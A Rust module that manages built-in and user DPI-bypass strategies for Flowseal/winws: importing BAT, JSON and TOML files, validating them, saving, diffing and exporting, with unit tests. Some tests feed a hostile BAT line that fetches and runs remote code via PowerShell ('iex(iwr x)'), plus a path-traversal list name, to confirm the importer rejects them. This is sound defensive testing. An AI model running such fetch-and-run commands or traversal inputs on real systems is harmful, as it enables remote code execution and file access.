//! StrategyManager: built-in Flowseal strategies (read-only, generated from
//! the original BAT files by the safe importer) and user strategies stored
//! separately as JSON files, unaffected by Flowseal updates.

use bridge_core::atomic::{backup_before_migration, write_atomic};
use bridge_core::batparse::{parse_bat, BatOptions, ImportNote};
use bridge_core::catalog::{build_catalog, Catalog};
use bridge_core::diff::{diff, StrategyDiff};
use bridge_core::ports::GameFilter;
use bridge_core::strategy::migrate::load_value;
use bridge_core::strategy::render::{render_args, render_lines, PreviewResolver};
use bridge_core::strategy::validate::{validate, Issue, ResourceIndex};
use bridge_core::strategy::{is_valid_id, slugify, summarize_rule, RuleSummary, Source, Strategy};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};

pub const MAX_IMPORT_SIZE: usize = 512 * 1024;

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StrategyListItem {
    pub id: String,
    pub name: String,
    pub description: String,
    pub source: Source,
    pub base_id: Option<String>,
    pub flowseal_version: Option<String>,
    pub rule_count: usize,
    pub has_udp: bool,
    pub has_voice_rule: bool,
    pub notes: Vec<String>,
    pub error_count: usize,
    /// Saved with validation errors: editable, but cannot be started.
    pub draft: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StrategyDetails {
    pub strategy: Strategy,
    pub issues: Vec<Issue>,
    pub summaries: Vec<RuleSummary>,
    pub args_preview: Vec<String>,
    pub lines_preview: Vec<String>,
    pub resources: Vec<bridge_core::strategy::ResourceRef>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportPreview {
    /// Server-side handle of the pending import; the commit re-parses the
    /// original file content stored under it.
    #[serde(default)]
    pub token: String,
    pub format: String,
    pub strategy: Strategy,
    pub notes: Vec<ImportNote>,
    pub unsupported: Vec<ImportNote>,
    pub issues: Vec<Issue>,
    pub migrated_from: Option<u64>,
}

pub struct StrategyManager {
    dir: PathBuf,
    pub catalog: Catalog,
    pub resources: ResourceIndex,
    pub custom: Vec<Strategy>,
    pub load_errors: Vec<String>,
    pending: std::collections::HashMap<String, PendingImport>,
    next_token: u64,
}

struct PendingImport {
    file_name: String,
    content: String,
}

const MAX_PENDING_IMPORTS: usize = 8;

fn has_voice(s: &Strategy) -> bool {
    s.rules.iter().any(|r| {
        r.args.iter().any(|a| {
            a.opt == "--filter-l7"
                && a.text_value()
                    .is_some_and(|v| v.split(',').any(|x| x == "discord" || x == "stun"))
        })
    })
}

impl StrategyManager {
    pub fn new(dir: PathBuf) -> Self {
        let mut m = StrategyManager {
            dir,
            catalog: Catalog::default(),
            resources: ResourceIndex::default(),
            custom: vec![],
            load_errors: vec![],
            pending: Default::default(),
            next_token: 1,
        };
        m.reload_custom();
        m
    }

    /// Install the built-in catalog of a Flowseal bundle.
    pub fn set_bundle(
        &mut self,
        version: &str,
        files: &[(String, String)],
        resources: ResourceIndex,
    ) {
        self.catalog = build_catalog(version, files);
        self.resources = resources;
    }

    pub fn reload_custom(&mut self) {
        self.custom.clear();
        self.load_errors.clear();
        let _ = fs::create_dir_all(&self.dir);
        let Ok(rd) = fs::read_dir(&self.dir) else {
            return;
        };
        let mut files: Vec<PathBuf> = rd
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().is_some_and(|e| e == "json"))
            .collect();
        files.sort();
        for p in files {
            let res = fs::read(&p)
                .map_err(|e| e.to_string())
                .and_then(|b| {
                    serde_json::from_slice::<serde_json::Value>(&b).map_err(|e| e.to_string())
                })
                .and_then(|v| load_value(v).map_err(|e| e.to_string()));
            match res {
                Ok(l) => {
                    if let Some(from) = l.migrated_from {
                        let _ = backup_before_migration(&p, from);
                        let _ = write_atomic(&p, l.strategy.to_json_pretty().as_bytes());
                    }
                    if l.strategy.source == Source::Flowseal || !is_valid_id(&l.strategy.id) {
                        self.load_errors.push(format!(
                            "{}: недопустимая пользовательская стратегия",
                            p.display()
                        ));
                        continue;
                    }
                    self.custom.push(l.strategy);
                }
                Err(e) => self.load_errors.push(format!("{}: {e}", file_name(&p))),
            }
        }
    }

    pub fn all(&self) -> impl Iterator<Item = &Strategy> {
        self.catalog.strategies.iter().chain(self.custom.iter())
    }

    pub fn get(&self, id: &str) -> Option<&Strategy> {
        self.all().find(|s| s.id == id)
    }

    pub fn builtin(&self, id: &str) -> Option<&Strategy> {
        self.catalog.strategies.iter().find(|s| s.id == id)
    }

    pub fn list(&self) -> Vec<StrategyListItem> {
        self.all()
            .map(|s| StrategyListItem {
                id: s.id.clone(),
                name: s.name.clone(),
                description: s.description.clone(),
                source: s.source,
                base_id: s.origin.base_id.clone(),
                flowseal_version: s.origin.flowseal_version.clone(),
                rule_count: s.rules.len(),
                has_udp: s
                    .rules
                    .iter()
                    .any(|r| r.args.iter().any(|a| a.opt == "--filter-udp")),
                has_voice_rule: has_voice(s),
                notes: s.notes.clone(),
                error_count: validate(s, Some(&self.resources)).errors().count(),
                draft: validate(s, Some(&self.resources)).has_errors(),
            })
            .collect()
    }

    pub fn details(&self, s: &Strategy, gf: &GameFilter) -> StrategyDetails {
        let report = validate(s, Some(&self.resources));
        StrategyDetails {
            strategy: s.clone(),
            issues: report.issues,
            summaries: s.rules.iter().map(summarize_rule).collect(),
            args_preview: render_args(s, &gf.ports(), &PreviewResolver).unwrap_or_default(),
            lines_preview: render_lines(s, &gf.ports()),
            resources: s.resources(),
        }
    }

    fn unique_id(&self, base: &str) -> String {
        let base = match base.strip_prefix("flowseal-") {
            Some(rest) => format!("my-{rest}"),
            None => base.to_string(),
        };
        let base: String = base.chars().take(56).collect();
        let base = base.trim_end_matches('-').to_string();
        if self.get(&base).is_none() {
            return base;
        }
        (2..1000)
            .map(|n| format!("{base}-{n}"))
            .find(|c| self.get(c).is_none())
            .unwrap_or_else(|| format!("{base}-x"))
    }

    fn path_for(&self, id: &str) -> PathBuf {
        self.dir.join(format!("{id}.json"))
    }

    /// Save a user strategy. Built-ins are immutable.
    pub fn save(&mut self, mut s: Strategy) -> Result<Strategy, String> {
        if self.builtin(&s.id).is_some() || s.source == Source::Flowseal {
            return Err("встроенные стратегии Flowseal нельзя изменить — создайте копию".into());
        }
        s.name = s.name.trim().to_string();
        // Drafts may contain semantic errors; unsafe or unbounded data may not.
        bridge_core::strategy::validate::validate_storable(&s)?;
        s.metadata
            .insert("updatedAt".into(), now_unix().to_string());
        write_atomic(&self.path_for(&s.id), s.to_json_pretty().as_bytes())
            .map_err(|e| e.to_string())?;
        match self.custom.iter_mut().find(|x| x.id == s.id) {
            Some(x) => *x = s.clone(),
            None => self.custom.push(s.clone()),
        }
        Ok(s)
    }

    pub fn create(&mut self, name: &str) -> Result<Strategy, String> {
        let id = self.unique_id(&slugify(name));
        let s = Strategy::new_empty(&id, name);
        self.save(s)
    }

    pub fn duplicate(&mut self, id: &str, new_name: Option<String>) -> Result<Strategy, String> {
        let src = self.get(id).ok_or("стратегия не найдена")?.clone();
        let mut s = src.clone();
        s.name = new_name.unwrap_or_else(|| format!("{} (копия)", src.name));
        s.id = self.unique_id(&slugify(&s.name));
        if src.source == Source::Flowseal {
            s.origin.base_id = Some(src.id.clone());
            s.origin.flowseal_version = src.origin.flowseal_version.clone();
        }
        s.source = Source::Custom;
        s.metadata
            .insert("createdAt".into(), now_unix().to_string());
        self.save(s)
    }

    pub fn rename(&mut self, id: &str, name: &str) -> Result<Strategy, String> {
        let mut s = self
            .custom
            .iter()
            .find(|x| x.id == id)
            .ok_or("переименовать можно только пользовательскую стратегию")?
            .clone();
        s.name = name.to_string();
        self.save(s)
    }

    pub fn delete(&mut self, id: &str) -> Result<(), String> {
        if self.builtin(id).is_some() {
            return Err("встроенные стратегии удалить нельзя".into());
        }
        let pos = self
            .custom
            .iter()
            .position(|x| x.id == id)
            .ok_or("стратегия не найдена")?;
        let p = self.path_for(id);
        if p.exists() {
            fs::remove_file(&p).map_err(|e| e.to_string())?;
        }
        self.custom.remove(pos);
        Ok(())
    }

    /// Reset a copy of a built-in strategy to the current original rules.
    pub fn restore_original(&mut self, id: &str) -> Result<Strategy, String> {
        let s = self
            .custom
            .iter()
            .find(|x| x.id == id)
            .ok_or("стратегия не найдена")?
            .clone();
        let base_id = s
            .origin
            .base_id
            .clone()
            .ok_or("у стратегии нет оригинала Flowseal")?;
        let base = self
            .builtin(&base_id)
            .ok_or("оригинальная стратегия отсутствует в текущей версии Flowseal")?
            .clone();
        let mut restored = base.clone();
        restored.id = s.id.clone();
        restored.name = s.name.clone();
        restored.source = Source::Custom;
        restored.origin.base_id = Some(base.id.clone());
        restored.metadata = s.metadata.clone();
        self.save(restored)
    }

    pub fn compare(&self, a: &str, b: &str, gf: &GameFilter) -> Result<StrategyDiff, String> {
        let l = self.get(a).ok_or("первая стратегия не найдена")?;
        let r = self.get(b).ok_or("вторая стратегия не найдена")?;
        Ok(diff(l, r, &gf.ports()))
    }

    /// Parse a file for import. Never executes anything.
    /// Parse a file for import and remember its original content under a
    /// token. Never executes anything.
    pub fn preview_import(
        &mut self,
        file_name: &str,
        content: &str,
    ) -> Result<ImportPreview, String> {
        let mut p = self.parse_import(file_name, content)?;
        let token = format!("imp-{}", self.next_token);
        self.next_token += 1;
        if self.pending.len() >= MAX_PENDING_IMPORTS {
            self.pending.clear();
        }
        self.pending.insert(
            token.clone(),
            PendingImport {
                file_name: file_name.into(),
                content: content.into(),
            },
        );
        p.token = token;
        Ok(p)
    }

    /// Commit a pending import: the stored original is parsed again and
    /// re-validated here; nothing from the UI's copy of the preview is trusted
    /// except the display name, which is checked like any other name.
    pub fn commit_import(
        &mut self,
        token: &str,
        name: Option<String>,
        accept_partial: bool,
    ) -> Result<Strategy, String> {
        let pending = self
            .pending
            .remove(token)
            .ok_or("импорт устарел — выберите файл заново")?;
        let mut p = self.parse_import(&pending.file_name, &pending.content)?;
        if !p.unsupported.is_empty() && !accept_partial {
            self.pending.insert(token.into(), pending);
            return Err("файл содержит неподдерживаемые команды — подтвердите импорт только поддерживаемых частей".into());
        }
        if let Some(n) = name.filter(|n| !n.trim().is_empty()) {
            p.strategy.name = n;
        }
        p.strategy.source = Source::Imported;
        p.strategy.origin.base_id = p
            .strategy
            .origin
            .base_id
            .filter(|b| self.builtin(b).is_some());
        self.save(p.strategy)
    }

    /// Create «Discord Only» from the current Flowseal `general` strategy.
    pub fn create_discord_only(&mut self) -> Result<Strategy, String> {
        let general = self
            .builtin("flowseal-general")
            .ok_or("в текущем наборе Flowseal нет стратегии general")?
            .clone();
        let id = self.unique_id("discord-only");
        self.save(bridge_core::templates::discord_only_from(&general, &id))
    }

    fn parse_import(&self, file_name: &str, content: &str) -> Result<ImportPreview, String> {
        if content.len() > MAX_IMPORT_SIZE {
            return Err("файл слишком большой".into());
        }
        let lower = file_name.to_ascii_lowercase();
        let stem = Path::new(file_name)
            .file_stem()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "Импорт".into());
        let (format, mut strategy, notes, unsupported, migrated_from) = if lower.ends_with(".bat")
            || lower.ends_with(".cmd")
        {
            let r = parse_bat(
                content,
                &BatOptions {
                    name: stem.clone(),
                    file: Some(file_name.to_string()),
                    ..Default::default()
                },
            )
            .map_err(|e| e.to_string())?;
            ("bat".to_string(), r.strategy, r.notes, r.unsupported, None)
        } else if lower.ends_with(".json") {
            let v: serde_json::Value = serde_json::from_str(content)
                .map_err(|e| format!("JSON: строка {}, столбец {}: {e}", e.line(), e.column()))?;
            let l = load_value(v).map_err(|e| e.to_string())?;
            ("json".into(), l.strategy, vec![], vec![], l.migrated_from)
        } else if lower.ends_with(".toml") {
            let v: toml::Value = toml::from_str(content).map_err(|e| format!("TOML: {e}"))?;
            let json = serde_json::to_value(v).map_err(|e| e.to_string())?;
            let l = load_value(json).map_err(|e| e.to_string())?;
            ("toml".into(), l.strategy, vec![], vec![], l.migrated_from)
        } else {
            return Err("поддерживаются файлы .bat, .json и .toml".into());
        };
        strategy.source = Source::Imported;
        if !is_valid_id(&strategy.id) || self.get(&strategy.id).is_some() {
            strategy.id = self.unique_id(&slugify(&strategy.name));
        }
        let issues = validate(&strategy, Some(&self.resources)).issues;
        Ok(ImportPreview {
            token: String::new(),
            format,
            strategy,
            notes,
            unsupported,
            issues,
            migrated_from,
        })
    }

    pub fn export(&self, id: &str, format: &str) -> Result<String, String> {
        let s = self.get(id).ok_or("стратегия не найдена")?;
        match format {
            "json" => Ok(s.to_json_pretty()),
            "toml" => s.to_toml().map_err(|e| e.to_string()),
            _ => Err("неизвестный формат экспорта".into()),
        }
    }

    /// Parse a strategy from the code editor; returns location-aware errors.
    pub fn parse_editor(text: &str) -> Result<Strategy, (String, Option<usize>, Option<usize>)> {
        let v: serde_json::Value = serde_json::from_str(text)
            .map_err(|e| (e.to_string(), Some(e.line()), Some(e.column())))?;
        load_value(v)
            .map(|l| l.strategy)
            .map_err(|e| (e.to_string(), None, None))
    }
}

fn file_name(p: &Path) -> String {
    p.file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default()
}

pub fn now_unix() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    const BAT: &str = "@echo off\r\nset \"BIN=%~dp0bin\\\"\r\nset \"LISTS=%~dp0lists\\\"\r\nstart \"z\" /min \"%BIN%winws.exe\" --wf-tcp=443 --wf-udp=443 ^\r\n--filter-tcp=443 --hostlist=\"%LISTS%list-general.txt\" --dpi-desync=fake --dpi-desync-fake-tls=\"%BIN%stun.bin\" --new ^\r\n--filter-udp=443 --dpi-desync=fake\r\n";

    fn mgr(dir: &Path) -> StrategyManager {
        let mut m = StrategyManager::new(dir.to_path_buf());
        let res = bridge_core::catalog::resource_index(["stun.bin"], ["list-general.txt"]);
        m.set_bundle("1.10.4", &[("general.bat".into(), BAT.into())], res);
        m
    }

    #[test]
    fn builtins_are_protected_and_copies_restore() {
        let d = tempfile::tempdir().unwrap();
        let mut m = mgr(d.path());
        assert_eq!(m.catalog.strategies.len(), 1);
        let b = m.catalog.strategies[0].clone();
        assert!(m.save(b.clone()).is_err());
        assert!(m.delete(&b.id).is_err());

        let mut copy = m.duplicate(&b.id, None).unwrap();
        assert_eq!(copy.origin.base_id.as_deref(), Some("flowseal-general"));
        assert_eq!(copy.source, Source::Custom);
        copy.rules[0].args[2] = bridge_core::Arg::text("--dpi-desync", "multisplit");
        m.save(copy.clone()).unwrap();
        let gf = GameFilter::default();
        assert!(!m.compare(&b.id, &copy.id, &gf).unwrap().identical);
        let restored = m.restore_original(&copy.id).unwrap();
        assert_eq!(restored.rules, b.rules);
        assert!(m
            .compare(&b.id, &copy.id, &gf)
            .unwrap()
            .rules
            .iter()
            .all(|r| r.changes.is_empty()));
    }

    #[test]
    fn custom_strategies_survive_flowseal_update_and_reload() {
        let d = tempfile::tempdir().unwrap();
        let mut m = mgr(d.path());
        let c = m.create("Моя стратегия").unwrap();
        // simulate a Flowseal update with a different catalog
        m.set_bundle("1.11.0", &[], ResourceIndex::default());
        assert!(m.get(&c.id).is_some());
        let m2 = StrategyManager::new(d.path().to_path_buf());
        assert_eq!(m2.custom.len(), 1);
        assert_eq!(m2.custom[0].name, "Моя стратегия");
    }

    #[test]
    fn import_export_reimport() {
        let d = tempfile::tempdir().unwrap();
        let mut m = mgr(d.path());
        let p = m.preview_import("my.bat", BAT).unwrap();
        assert!(p.unsupported.is_empty());
        assert!(
            p.issues
                .iter()
                .all(|i| i.severity != bridge_core::strategy::validate::Severity::Error),
            "{:?}",
            p.issues
        );
        let saved = m.save(p.strategy).unwrap();
        let json = m.export(&saved.id, "json").unwrap();
        let p2 = m.preview_import("x.json", &json).unwrap();
        assert_ne!(p2.strategy.id, saved.id, "id collision resolved");
        assert_eq!(p2.strategy.rules, saved.rules);
        let toml_text = m.export(&saved.id, "toml").unwrap();
        let p3 = m.preview_import("x.toml", &toml_text).unwrap();
        assert_eq!(p3.strategy.rules, saved.rules);
    }

    #[test]
    fn import_commit_reparses_server_side_and_requires_consent() {
        let d = tempfile::tempdir().unwrap();
        let mut m = mgr(d.path());
        let evil = "powershell -c iex(iwr x)\r\n\"%BIN%winws.exe\" --wf-tcp=443 --filter-tcp=443 --dpi-desync=fake\r\n";
        let p = m.preview_import("evil.bat", evil).unwrap();
        assert_eq!(p.unsupported.len(), 1);
        assert!(
            m.commit_import(&p.token, None, false).is_err(),
            "partial import needs consent"
        );
        let s = m
            .commit_import(&p.token, Some("Мой импорт".into()), true)
            .unwrap();
        assert_eq!(s.source, Source::Imported);
        assert_eq!(s.name, "Мой импорт");
        assert!(
            m.commit_import(&p.token, None, true).is_err(),
            "token is single-use"
        );
        assert!(
            m.commit_import("imp-999", None, true).is_err(),
            "unknown token"
        );
    }

    #[test]
    fn drafts_can_be_saved_but_are_flagged() {
        let d = tempfile::tempdir().unwrap();
        let mut m = mgr(d.path());
        let mut s = m.create("Черновик").unwrap();
        s.rules[0]
            .args
            .push(bridge_core::Arg::text("--dpi-desync-repeats", "много"));
        m.save(s.clone()).unwrap();
        let item = m.list().into_iter().find(|i| i.id == s.id).unwrap();
        assert!(item.draft && item.error_count > 0);
    }

    #[test]
    fn dangerous_imports() {
        let d = tempfile::tempdir().unwrap();
        let mut m = mgr(d.path());
        assert!(m.preview_import("x.exe", "MZ").is_err());
        let p = m.preview_import("evil.bat", "powershell -c iex(iwr x)\r\n\"%BIN%winws.exe\" --wf-tcp=443 --filter-tcp=443 --dpi-desync=fake\r\n").unwrap();
        assert_eq!(p.unsupported.len(), 1);
        assert!(m.preview_import("e.json", r#"{"schemaVersion":1,"id":"a","name":"a","source":"custom","rules":[],"exe":"C:\\x.exe"}"#).is_err());
        let bad = r#"{"schemaVersion":1,"id":"a","name":"a","source":"custom","global":[{"opt":"--wf-tcp","value":"443"}],"rules":[{"args":[{"opt":"--hostlist","value":{"list":"..\\..\\x"}}]}]}"#;
        let p = m.preview_import("e.json", bad).unwrap();
        assert!(p
            .issues
            .iter()
            .any(|i| i.message.contains("недопустимое имя")));
        assert!(
            StrategyManager::parse_editor("{\n  \"a\": ,\n}")
                .unwrap_err()
                .1
                == Some(2)
        );
    }
}
